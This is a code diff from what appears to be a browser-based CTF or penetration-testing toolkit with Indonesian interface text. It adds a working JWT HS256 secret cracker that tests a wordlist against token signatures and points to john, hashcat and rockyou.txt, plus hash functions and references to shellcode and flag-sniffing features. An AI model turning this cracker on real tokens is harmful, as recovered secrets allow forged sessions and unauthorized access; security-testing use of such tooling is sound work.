+    const out = document.getElementById('jwt_out');
+    if (!raw) return;
+
+    out.innerHTML = '<div class="infobox" style="margin-top:10px"><span>Memeriksa wordlist umum terhadap signature HS256…</span></div>';
+
+    const parts = raw.split('.');
+    if (parts.length !== 3) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Bukan token JWT HS256 bervaliditas signature 3 bagian.</span></div>';
+      return;
+    }
+
+    const enc = new TextEncoder();
+    const message = enc.encode(parts[0] + '.' + parts[1]);
+    const targetSigB64 = parts[2].replace(/-/g, '+').replace(/_/g, '/');
+
+    let foundSecret = null;
+    for (const secret of WORDLIST_SAMPLE) {
+      try {
+        const key = await crypto.subtle.importKey(
+          'raw',
+          enc.encode(secret),
+          { name: 'HMAC', hash: 'SHA-256' },
+          false,
+          ['sign']
+        );
+        const sigBuf = await crypto.subtle.sign('HMAC', key, message);
+        const sigArr = Array.from(new Uint8Array(sigBuf));
+        const sigB64 = btoa(String.fromCharCode(...sigArr));
+        if (sigB64.replace(/=/g, '') === targetSigB64.replace(/=/g, '')) {
+          foundSecret = secret;
+          break;
+        }
+      } catch(e) {}
+    }
+
+    if (foundSecret) {
+      out.innerHTML = renderCodeBox('JWT SECRET CRACKED', 'JWT HS256 Secret : "' + foundSecret + '"\nStatus: VERIFIED');
+    } else {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px"><span>Rahasia token tidak ditemukan di kamus cepat. Gunakan john / hashcat / jwt-cracker dengan rockyou.txt.</span></div>';
+    }
   }
 
   function runEncoder() {
@@ -2317,13 +2752,16 @@ button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
     if (!txt) return;
 
     try {
-      const bytes = NobleCrypto.utf8ToBytes(txt);
       let hash = '';
-      if (algo === 'sha256') hash = NobleCrypto.bytesToHex(NobleCrypto.sha256(bytes));
-      else if (algo === 'sha512') hash = NobleCrypto.bytesToHex(NobleCrypto.sha512(bytes));
-      else if (algo === 'keccak256') hash = NobleCrypto.bytesToHex(NobleCrypto.keccak_256(bytes));
-      else if (algo === 'ripemd160') hash = NobleCrypto.bytesToHex(NobleCrypto.ripemd160(bytes));
-      else hash = NobleCrypto.bytesToHex(NobleCrypto.sha256(bytes));
+      if (algo === 'md5') hash = md5(txt);
+      else if (algo === 'sha1') hash = sha1(txt);
+      else {
+        const bytes = NobleCrypto.utf8ToBytes(txt);
+        if (algo === 'sha256') hash = NobleCrypto.bytesToHex(NobleCrypto.sha256(bytes));
+        else if (algo === 'sha512') hash = NobleCrypto.bytesToHex(NobleCrypto.sha512(bytes));
+        else if (algo === 'keccak256') hash = NobleCrypto.bytesToHex(NobleCrypto.keccak_256(bytes));
+        else if (algo === 'ripemd160') hash = NobleCrypto.bytesToHex(NobleCrypto.ripemd160(bytes));
+      }
 
       out.innerHTML = renderCodeBox(algo.toUpperCase(), hash);
     } catch(err) {
@@ -2331,11 +2769,21 @@ button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
     }
   }
 
-// ---------------- INITIALIZATION ----------------
+  async function loadCheatsheetsLive() {
+    try {
+      const res = await fetch('/api/web/cheatsheets');
+      const j = await res.json();
+      if (j && j.success && j.data) {
+        Object.assign(CHEATSHEETS, j.data);
+      }
+    } catch(e) {}
+  }
+
+  // ---------------- INITIALIZATION ----------------
   document.addEventListener('DOMContentLoaded', () => {
     initSubtabs();
     initBurger();
-    renderCheatsheets('ALL');
+    loadCheatsheetsLive().then(() => renderCheatsheets('ALL'));
     renderShellcode('x64_execve');
 
     // DOM MutationObserver for Flag Sniffer
